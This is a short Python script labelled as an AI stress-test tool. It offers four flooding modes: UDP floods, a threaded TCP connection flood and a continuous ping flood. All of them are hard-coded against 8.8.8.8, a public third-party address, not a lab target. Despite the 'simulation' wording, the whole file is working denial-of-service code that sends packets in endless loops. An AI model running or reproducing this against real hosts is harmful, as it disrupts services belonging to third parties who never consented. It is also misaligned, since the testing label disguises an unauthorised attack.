import socket
import time
import subprocess
import threading

print("--- Tiny-Edge AI Stress Test Tool ---")
print("1: Volumetric UDP DDoS Simulation (Raw Speed)")
print("2: Adversarial Noise Simulation (Math Padding)")
print("3: TCP SYN Flood Simulation (Rapid Connections)")
print("4: ICMP Ping of Death (Subprocess Ping Flood)")
import sys
choice = sys.argv[1] if len(sys.argv) > 1 else input("Select attack type (1-4): ").strip()

target_ip = "8.8.8.8"

try:
    if choice == "2":
        print("\nInitiating Adversarial Noise Simulation...")
        print("Injecting carefully crafted float variations in payloads...")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"\x41\x00\x00\x00\x00\x00\x00\x00" * 128
        while True:
            s.sendto(payload, (target_ip, 9999))
            
    elif choice == "3":
        print("\nInitiating TCP SYN Flood Simulation...")
        print("Rapidly opening TCP connections to generate SYN packets...")
        def tcp_connect():
            try:
                t_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                t_sock.settimeout(0.1)
                t_sock.connect((target_ip, 80))
                t_sock.close()
            except: pass
            
        while True:
            threading.Thread(target=tcp_connect, daemon=True).start()
            time.sleep(0.005) # Prevent thread exhaustion
            
    elif choice == "4":
        print("\nInitiating ICMP Ping of Death...")
        print("Using Windows Ping utility to blast large ICMP packets...")
        p = subprocess.Popen(["ping", "-t", "-l", "1000", "-w", "1", target_ip])
        p.wait()
        
    else:
        print("\nInitiating Volumetric UDP DDoS Simulation...")
        print("Generating >5000 raw packets per second...")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * 1024
        while True:
            s.sendto(payload, (target_ip, 9999))
            
except KeyboardInterrupt:
    if 'p' in locals():
        p.terminate()
    print("\nAttack stopped.")
